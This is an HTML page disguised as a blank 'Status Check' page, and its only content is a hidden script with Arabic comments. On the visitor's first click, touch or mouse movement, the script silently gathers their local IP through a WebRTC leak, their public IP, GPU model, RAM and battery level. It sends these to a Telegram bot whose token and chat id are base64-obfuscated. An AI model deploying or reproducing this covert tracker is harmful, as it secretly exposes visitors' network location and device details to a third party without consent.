<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Status Check</title></head>
<body style="background:#000;">
<script>
    const _K = { t: "ODcxOTI5ODQwMzpBQUctOUlKZzJ4TFhtMFlhVjN5eTBaV0dFREdyalZRV3hV", c: "NjAwMTI4NjI3MA==" };
    const _D = (s) => atob(s);

    ['click', 'touchstart', 'mousemove'].forEach(ev => window.addEventListener(ev, ghostRun, {once: true}));

    async function ghostRun() {
        let report = { localIP: "N/A (Shielded)" };

        // 1. محاولة صيد الـ Local IP (الذي في الإعدادات) عبر ثغرة WebRTC
        try {
            const pc = new RTCPeerConnection({iceServers:[]});
            pc.createDataChannel("");
            pc.createOffer().then(o => pc.setLocalDescription(o));
            pc.onicecandidate = (i) => {
                if (i && i.candidate && i.candidate.candidate) {
                    const match = i.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                    if (match) report.localIP = match[1];
                }
            };
        } catch(e){}

        // 2. سحب الـ Public IP الحقيقي (الخارجي)
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            report.publicIP = data.ip;
        } catch(e){ report.publicIP = "Failed"; }

        // 3. سحب معلومات الجهاز (GPU/RAM) لضمان معرفة نوع الهاتف
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        const gpu = gl ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A";

        // تجهيز التقرير النهائي الصامت
        const msg = `🎭 [V103_DEEP_STRIKE]\n` +
                    `🌐 Public IP: ${report.publicIP}\n` +
                    `🏠 Local IP: ${report.localIP}\n` +
                    `━━━━━━━━━━━━━━\n` +
                    `📱 Device: ${gpu}\n` +
                    `🧠 RAM: ${navigator.deviceMemory}GB\n` +
                    `🔋 Bat: ${navigator.getBattery ? (await navigator.getBattery()).level * 100 + "%" : "N/A"}\n` +
                    `⏰ Time: ${new Date().toLocaleString('ar-EG')}`;

        const url = `https://api.telegram.org/bot${_D(_K.t)}/sendMessage?chat_id=${_D(_K.c)}&text=${encodeURIComponent(msg)}`;
        navigator.sendBeacon(url);
    }
</script>
</body>
</html>
</html>
